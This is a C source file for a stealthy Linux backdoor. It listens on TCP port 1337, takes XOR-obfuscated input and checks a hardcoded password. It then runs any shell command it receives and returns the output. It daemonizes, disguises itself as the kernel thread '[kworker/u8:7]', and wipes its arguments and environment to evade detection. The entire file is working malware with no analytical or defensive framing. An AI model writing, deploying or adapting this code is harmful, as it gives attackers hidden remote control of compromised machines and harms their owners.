// 
#define _GNU_SOURCE
#include <sys/prctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/stat.h>

#define PORT 1337
#define SECRET "sesame:street"
#define XOR_KEY "myxor"

void xor_decrypt(char *data, size_t len) {
    size_t key_len = strlen(XOR_KEY);
    for (size_t i = 0; i < len; ++i) {
        data[i] ^= XOR_KEY[i % key_len];
    }
}

char *trim(char *str) {
    while (isspace(*str)) str++;
    if (*str == '\0') return str;

    char *end = str + strlen(str) - 1;
    while (end > str && isspace(*end)) end--;
    *(end + 1) = '\0';
    return str;
}

void handle_client(int client_sock) {
    char buffer[2048];
    int len = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
    if (len <= 0) {
        close(client_sock);
        return;
    }

    buffer[len] = '\0';
    xor_decrypt(buffer, len);
    char *trimmed = trim(buffer);

    if (strncmp(trimmed, SECRET, strlen(SECRET)) == 0 && trimmed[strlen(SECRET)] == ' ') {
        char *cmd = trimmed + strlen(SECRET) + 1;

        FILE *fp = popen(cmd, "r");
        if (!fp) {
            send(client_sock, "Failed to execute command\n", 26, 0);
        } else {
            char out[1024];
            while (fgets(out, sizeof(out), fp) != NULL) {
                send(client_sock, out, strlen(out), 0);
            }
            pclose(fp);
        }
    } else {
        const char *msg = "Invalid secret\n";
        send(client_sock, msg, strlen(msg), 0);
    }

    close(client_sock);
}

void daemonize(const char *fake_name) {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) exit(EXIT_FAILURE);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    chdir("/");

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // установить taskname
    prctl(PR_SET_NAME, (unsigned long) fake_name, 0, 0, 0);

    // записать в /proc/self/comm
    FILE *f = fopen("/proc/self/comm", "w");
    if (f) {
        fprintf(f, "%s\n", fake_name);
        fclose(f);
    }
}

int main(int argc, char *argv[]) {
    extern char **environ;

    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) exit(1);

    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) exit(1);
    if (listen(server_sock, 5) < 0) exit(1);

    daemonize("[kworker/u8:7]");

    // переопределяем argv[0]
    if (argc > 0) {
        memset(argv[0], 0, strlen(argv[0]));
        strncpy(argv[0], "[kworker/u8:7]", strlen("[kworker/u8:7]"));
    }

    // чистим все остальные argv[i]
    for (int i = 1; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }

    // чистим окружение
    for (char **env = environ; *env != NULL; env++) {
        memset(*env, 0, strlen(*env));
    }

    while (1) {
        struct sockaddr_in client;
        socklen_t len = sizeof(client);
        int client_sock = accept(server_sock, (struct sockaddr *)&client, &len);
        if (client_sock >= 0) {
            pid_t pid = fork();
            if (pid == 0) {
                handle_client(client_sock);
                exit(0);
            } else {
                close(client_sock);
                waitpid(-1, NULL, WNOHANG);
            }
        }
    }

    return 0;
}
